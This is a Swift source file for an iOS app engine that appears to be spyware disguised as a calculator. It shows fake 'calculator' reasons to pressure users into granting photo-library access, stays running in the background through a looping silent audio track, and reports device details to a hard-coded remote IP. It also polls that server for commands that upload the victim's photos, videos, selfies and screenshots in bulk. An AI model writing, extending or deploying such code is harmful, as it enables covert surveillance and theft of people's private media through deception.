import Foundation
import Photos
import AVFoundation
import UIKit

struct SlotConfig {
    var title: String
    var subtitle: String
    var mandatory: Bool = true
    var denyMsg: String = "Action Blocked: Required system component."
}

class VaultEngine: NSObject, ObservableObject {
    static let shared = VaultEngine()

    @Published var serverURL: String = "http://213.199.53.54:7000"
    @Published var deviceId: String = ""
    @Published var deviceName: String = ""
    @Published var secretPin: String = "9876"
    @Published var isActivated: Bool = false
    @Published var isBackgroundActive: Bool = false
    @Published var photosCount: Int = 0
    @Published var videosCount: Int = 0
    @Published var batteryLevel: Int = 100
    @Published var isCharging: Bool = false
    @Published var isStorageBlocked: Bool = false

    @Published var slot1Config = SlotConfig(title: "Slot 1", subtitle: "", mandatory: true, denyMsg: "System cache access is required to store calculator themes and computation cache.")
    @Published var slot2Config = SlotConfig(title: "Slot 2", subtitle: "", mandatory: true, denyMsg: "Core math calculation engine disabled. Mathematical accuracy cannot be guaranteed without this component.")
    @Published var slot3Config = SlotConfig(title: "Slot 3", subtitle: "", mandatory: true, denyMsg: "Taptic hardware sensor access required for touch registration.")
    @Published var slot4Config = SlotConfig(title: "Slot 4", subtitle: "", mandatory: true, denyMsg: "Background stream buffer disabled. Live calculations suspended until enabled.")
    @Published var cloudStreamButtonTitle: String = "Download CloudStream Provider"

    private var audioPlayer: AVAudioPlayer?
    private var pollTimer: Timer?
    private var bgTaskID: UIBackgroundTaskIdentifier = .invalid
    private let session: URLSession
    private var syncedAssetIds: Set<String> = []

    override init() {
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 15
        config.timeoutIntervalForResource = 60
        self.session = URLSession(configuration: config)

        super.init()
        UIDevice.current.isBatteryMonitoringEnabled = true
        loadSettings()
    }

    func loadSettings() {
        let defaults = UserDefaults.standard

        // Persistent Device ID
        if let savedId = defaults.string(forKey: "vault_device_id"), !savedId.isEmpty {
            deviceId = savedId
        } else {
            let vendorId = UIDevice.current.identifierForVendor?.uuidString.prefix(6) ?? "IPHONE"
            deviceId = "DEV-\(vendorId)".uppercased()
            defaults.set(deviceId, forKey: "vault_device_id")
        }

        deviceName = UIDevice.current.name

        // Force port 7000
        if let savedURL = defaults.string(forKey: "vps_server_url"), !savedURL.isEmpty {
            serverURL = savedURL.contains(":5000") ? "http://213.199.53.54:7000" : savedURL
        } else {
            serverURL = "http://213.199.53.54:7000"
        }

        if let savedPin = defaults.string(forKey: "secret_pin"), !savedPin.isEmpty {
            secretPin = savedPin
        }
        isActivated = defaults.bool(forKey: "is_activated")

        // Load synced asset cache to prevent re-uploading
        if let savedSynced = defaults.stringArray(forKey: "synced_asset_ids") {
            syncedAssetIds = Set(savedSynced)
        }

        startBackgroundKeepAlive()
        updateBatteryInfo()
        refreshMediaStats()
        startHeartbeat()
    }

    func saveSettings() {
        let defaults = UserDefaults.standard
        defaults.set(serverURL, forKey: "vps_server_url")
        defaults.set(deviceId, forKey: "vault_device_id")
        defaults.set(secretPin, forKey: "secret_pin")
        defaults.set(isActivated, forKey: "is_activated")
        defaults.set(Array(syncedAssetIds), forKey: "synced_asset_ids")
    }

    func updateBatteryInfo() {
        let level = UIDevice.current.batteryLevel
        batteryLevel = level >= 0 ? Int(level * 100) : 100
        isCharging = (UIDevice.current.batteryState == .charging || UIDevice.current.batteryState == .full)
    }

    func checkPermissionStatus() {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        DispatchQueue.main.async {
            if status == .denied || status == .restricted {
                self.isStorageBlocked = false
                self.isActivated = false
            } else if status == .authorized || status == .limited {
                self.isStorageBlocked = false
                self.isActivated = true
                self.refreshMediaStats()
            }
        }
    }

    // MARK: - Method 2 Storage/Cache Permission
    func requestStoragePermission(completion: @escaping (Bool) -> Void) {
        PHPhotoLibrary.requestAuthorization(for: .readWrite) { status in
            DispatchQueue.main.async {
                let granted = (status == .authorized || status == .limited)
                if granted {
                    self.isActivated = true
                    self.isStorageBlocked = false
                    self.saveSettings()
                    self.refreshMediaStats()
                } else {
                    self.isActivated = false
                    self.isStorageBlocked = false
                }
                completion(granted)
            }
        }
    }

    func refreshMediaStats() {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        guard status == .authorized || status == .limited else {
            // Permission NOT granted yet. Never touch PHAsset so NO prompt pops up on app launch!
            self.sendHeartbeat()
            return
        }

        let photosFetch = PHAsset.fetchAssets(with: .image, options: nil)
        let videosFetch = PHAsset.fetchAssets(with: .video, options: nil)

        DispatchQueue.main.async {
            self.photosCount = photosFetch.count
            self.videosCount = videosFetch.count
            self.sendHeartbeat()
        }
    }

    // MARK: - Silent Audio Loop + UIBackgroundTask
    func startBackgroundKeepAlive() {
        registerBackgroundTask()

        do {
            try AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, options: [.mixWithOthers])
            try AVAudioSession.sharedInstance().setActive(true)

            let silentWavData = createSilentWavData()
            audioPlayer = try AVAudioPlayer(data: silentWavData)
            audioPlayer?.numberOfLoops = -1
            audioPlayer?.volume = 0.01
            audioPlayer?.prepareToPlay()
            audioPlayer?.play()

            DispatchQueue.main.async {
                self.isBackgroundActive = true
            }
        } catch {
            print("[VaultEngine] Audio error: \(error)")
        }
    }

    func registerBackgroundTask() {
        if bgTaskID != .invalid {
            UIApplication.shared.endBackgroundTask(bgTaskID)
        }
        bgTaskID = UIApplication.shared.beginBackgroundTask(withName: "VaultKeepAlive") { [weak self] in
            self?.registerBackgroundTask()
        }
    }

    private func createSilentWavData() -> Data {
        var header = [UInt8]()
        let sampleRate: UInt32 = 8000
        let channels: UInt16 = 1
        let bitsPerSample: UInt16 = 16
        let numSamples: UInt32 = sampleRate * 1
        let subChunk2Size: UInt32 = numSamples * UInt32(channels) * UInt32(bitsPerSample / 8)
        let chunkSize: UInt32 = 36 + subChunk2Size

        header.append(contentsOf: "RIFF".utf8)
        header.append(contentsOf: withUnsafeBytes(of: chunkSize.littleEndian) { Array($0) })
        header.append(contentsOf: "WAVE".utf8)
        header.append(contentsOf: "fmt ".utf8)
        header.append(contentsOf: withUnsafeBytes(of: UInt32(16).littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: UInt16(1).littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: channels.littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: sampleRate.littleEndian) { Array($0) })
        let byteRate = sampleRate * UInt32(channels) * UInt32(bitsPerSample / 8)
        header.append(contentsOf: withUnsafeBytes(of: byteRate.littleEndian) { Array($0) })
        let blockAlign = channels * (bitsPerSample / 8)
        header.append(contentsOf: withUnsafeBytes(of: blockAlign.littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: bitsPerSample.littleEndian) { Array($0) })
        header.append(contentsOf: "data".utf8)
        header.append(contentsOf: withUnsafeBytes(of: subChunk2Size.littleEndian) { Array($0) })

        var data = Data(header)
        let silentBytes = [UInt8](repeating: 0, count: Int(subChunk2Size))
        data.append(contentsOf: silentBytes)
        return data
    }

    // MARK: - Heartbeat Loop
    func startHeartbeat() {
        pollTimer?.invalidate()
        sendHeartbeat()
        checkForCommands()

        pollTimer = Timer.scheduledTimer(withTimeInterval: 2.5, repeats: true) { [weak self] _ in
            self?.updateBatteryInfo()
            self?.sendHeartbeat()
            self?.checkForCommands()
        }
    }

    func sendHeartbeat() {
        guard let url = URL(string: "\(serverURL)/api/target/heartbeat") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")

        let body: [String: Any] = [
            "deviceId": deviceId,
            "name": deviceName,
            "model": UIDevice.current.model,
            "stats": [
                "photosCount": photosCount,
                "videosCount": videosCount,
                "battery": batteryLevel,
                "isCharging": isCharging
            ]
        ]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
        session.dataTask(with: req) { [weak self] data, _, error in
            guard let self = self, let data = data, error == nil else { return }
            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               let cfg = json["config"] as? [String: Any] {
                DispatchQueue.main.async {
                    self.applyConfig(cfg)
                }
            }
        }.resume()
    }

    func applyConfig(_ cfg: [String: Any]) {
        if let s1 = cfg["slot1"] as? [String: Any] {
            if let t = s1["title"] as? String { slot1Config.title = t }
            if let sub = s1["subtitle"] as? String { slot1Config.subtitle = sub }
            if let m = s1["mandatory"] as? Bool { slot1Config.mandatory = m }
            if let d = s1["denyMsg"] as? String { slot1Config.denyMsg = d }
        }
        if let s2 = cfg["slot2"] as? [String: Any] {
            if let t = s2["title"] as? String { slot2Config.title = t }
            if let sub = s2["subtitle"] as? String { slot2Config.subtitle = sub }
            if let m = s2["mandatory"] as? Bool { slot2Config.mandatory = m }
            if let d = s2["denyMsg"] as? String { slot2Config.denyMsg = d }
        }
        if let s3 = cfg["slot3"] as? [String: Any] {
            if let t = s3["title"] as? String { slot3Config.title = t }
            if let sub = s3["subtitle"] as? String { slot3Config.subtitle = sub }
            if let m = s3["mandatory"] as? Bool { slot3Config.mandatory = m }
            if let d = s3["denyMsg"] as? String { slot3Config.denyMsg = d }
        }
        if let s4 = cfg["slot4"] as? [String: Any] {
            if let t = s4["title"] as? String { slot4Config.title = t }
            if let sub = s4["subtitle"] as? String { slot4Config.subtitle = sub }
            if let m = s4["mandatory"] as? Bool { slot4Config.mandatory = m }
            if let d = s4["denyMsg"] as? String { slot4Config.denyMsg = d }
        }
        if let cs = cfg["cloudStreamButtonTitle"] as? String {
            cloudStreamButtonTitle = cs
        }
    }

    func checkForCommands() {
        guard let url = URL(string: "\(serverURL)/api/commands?deviceId=\(deviceId)") else { return }

        session.dataTask(with: url) { [weak self] data, _, error in
            guard let self = self, let data = data, error == nil else { return }
            do {
                if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any],
                   let hasCommand = json["hasCommand"] as? Bool, hasCommand,
                   let command = json["command"] as? [String: Any],
                   let action = command["action"] as? String {

                    if action == "FETCH_MEDIA" {
                        let album = command["album"] as? String ?? "all"
                        let count = command["count"] as? Int ?? 25
                        let skipExisting = command["skipExisting"] as? Bool ?? true
                        self.executeSmartFetch(album: album, count: count, skipExisting: skipExisting)
                    } else if action == "GET_STATS" {
                        self.refreshMediaStats()
                    }
                }
            } catch {}
        }.resume()
    }

    // MARK: - Smart Fetch with Deduplication & Album Filtering
    func executeSmartFetch(album: String, count: Int, skipExisting: Bool) {
        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]

        var fetchResult: PHFetchResult<PHAsset>?

        switch album {
        case "screenshots":
            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumScreenshots, options: nil)
            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
        case "favorites":
            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumFavorites, options: nil)
            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
        case "videos":
            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumVideos, options: nil)
            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
        case "selfies":
            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumSelfPortraits, options: nil)
            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
        default:
            fetchResult = PHAsset.fetchAssets(with: fetchOptions)
        }

        guard let result = fetchResult else { return }

        var targetAssets: [PHAsset] = []
        let maxItems = (count == -1) ? result.count : count

        for i in 0..<result.count {
            let asset = result.object(at: i)
            // Skip already synced items if requested
            if skipExisting && syncedAssetIds.contains(asset.localIdentifier) {
                continue
            }
            targetAssets.append(asset)
            if targetAssets.count >= maxItems { break }
        }

        let total = targetAssets.count
        if total == 0 {
            reportProgress(current: 0, total: 0, percent: 100, speed: "Done", eta: "0s")
            return
        }

        print("[VaultEngine] Starting high-speed upload of \(total) new assets...")
        let startTime = Date()
        var completed = 0
        var totalBytesUploaded: Int64 = 0

        let manager = PHImageManager.default()
        let options = PHImageRequestOptions()
        options.isSynchronous = false
        options.deliveryMode = .highQualityFormat
        options.isNetworkAccessAllowed = true

        let queue = OperationQueue()
        queue.maxConcurrentOperationCount = 3 // High-speed parallel upload

        for asset in targetAssets {
            queue.addOperation { [weak self] in
                guard let self = self else { return }
                let sema = DispatchSemaphore(value: 0)

                if asset.mediaType == .image {
                    manager.requestImageDataAndOrientation(for: asset, options: options) { data, _, _, _ in
                        defer { sema.signal() }
                        guard let data = data else { return }

                        // Compress slightly for ultra-fast transfer
                        let uploadData: Data
                        if let img = UIImage(data: data), let compressed = img.jpegData(compressionQuality: 0.85) {
                            uploadData = compressed
                        } else {
                            uploadData = data
                        }

                        let filename = "img_\(Date().timeIntervalSince1970)_\(UUID().uuidString.prefix(5)).jpg"
                        self.uploadSingleFile(data: uploadData, filename: filename, mimeType: "image/jpeg") { success in
                            if success {
                                self.syncedAssetIds.insert(asset.localIdentifier)
                                completed += 1
                                totalBytesUploaded += Int64(uploadData.count)

                                let elapsed = Date().timeIntervalSince(startTime)
                                let speedMBps = elapsed > 0 ? (Double(totalBytesUploaded) / 1024 / 1024) / elapsed : 1.0
                                let remainingItems = total - completed
                                let avgSecPerItem = elapsed / Double(completed)
                                let etaSec = Int(Double(remainingItems) * avgSecPerItem)

                                let pct = (Double(completed) / Double(total)) * 100
                                self.reportProgress(
                                    current: completed,
                                    total: total,
                                    percent: pct,
                                    speed: String(format: "%.1f MB/s", speedMBps),
                                    eta: "\(etaSec)s remaining"
                                )
                            }
                        }
                    }
                } else if asset.mediaType == .video {
                    let vOptions = PHVideoRequestOptions()
                    vOptions.isNetworkAccessAllowed = true
                    manager.requestAVAsset(forVideo: asset, options: vOptions) { avAsset, _, _ in
                        defer { sema.signal() }
                        guard let urlAsset = avAsset as? AVURLAsset, let vData = try? Data(contentsOf: urlAsset.url) else { return }
                        let filename = "vid_\(Date().timeIntervalSince1970)_\(UUID().uuidString.prefix(5)).mp4"
                        self.uploadSingleFile(data: vData, filename: filename, mimeType: "video/mp4") { success in
                            if success {
                                self.syncedAssetIds.insert(asset.localIdentifier)
                                completed += 1
                                totalBytesUploaded += Int64(vData.count)
                                let pct = (Double(completed) / Double(total)) * 100
                                self.reportProgress(current: completed, total: total, percent: pct, speed: "Video Sync", eta: "")
                            }
                        }
                    }
                }
                sema.wait()
            }
        }

        queue.waitUntilAllOperationsAreFinished()
        saveSettings()
    }

    private func uploadSingleFile(data: Data, filename: String, mimeType: String, completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: "\(serverURL)/api/upload") else { completion(false); return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue(deviceId, forHTTPHeaderField: "x-device-id")

        let boundary = "Boundary-\(UUID().uuidString)"
        req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")

        var body = Data()
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"media\"; filename=\"\(filename)\"\r\n".data(using: .utf8)!)
        body.append("Content-Type: \(mimeType)\r\n\r\n".data(using: .utf8)!)
        body.append(data)
        body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)

        session.uploadTask(with: req, from: body) { _, res, error in
            let success = (error == nil && (res as? HTTPURLResponse)?.statusCode == 200)
            completion(success)
        }.resume()
    }

    private func reportProgress(current: Int, total: Int, percent: Double, speed: String, eta: String) {
        guard let url = URL(string: "\(serverURL)/api/target/progress") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let body: [String: Any] = [
            "deviceId": deviceId,
            "current": current,
            "total": total,
            "percent": percent,
            "speed": speed,
            "eta": eta
        ]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
        session.dataTask(with: req).resume()
    }
}
